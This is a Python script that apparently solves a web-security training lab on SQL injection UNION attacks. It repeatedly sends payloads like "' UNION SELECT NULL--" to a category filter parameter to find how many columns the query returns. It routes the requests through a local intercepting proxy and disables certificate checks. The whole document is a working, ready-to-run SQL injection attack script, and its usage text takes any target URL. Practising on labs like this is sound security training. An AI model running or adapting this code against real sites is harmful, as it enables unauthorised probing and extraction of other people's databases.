# SQL injection UNION attack, determining the number of columns returned by the query

import sys
import requests
import urllib3
import urllib.parse
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % injection_uri)
	return r

def exploit_sqli(s, url, payload):
	filter_path = url + '/filter?category='
	if payload == "SOLUTION":
		payload = "' UNION SELECT NULL--"
		for i in range(1, 8):
			if send_payload(s, filter_path, payload).status_code == 200:
				print('[+] Number of Columns returned:\t%s' % i)
				return True
			else:
				payload = payload[:-2]
				payload += ", NULL--"
	else:
		return send_payload(s, filter_path, payload).status_code == 200

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com " UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection UNION attack, determining the number of columns returned by the query')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	print('[+] Determining the number of columns returned by the query.\n')
	time.sleep(1)
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		if exploit_sqli(s, url, payload):
			print('\n[+] SQL Injection sent !')
		else:
			print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
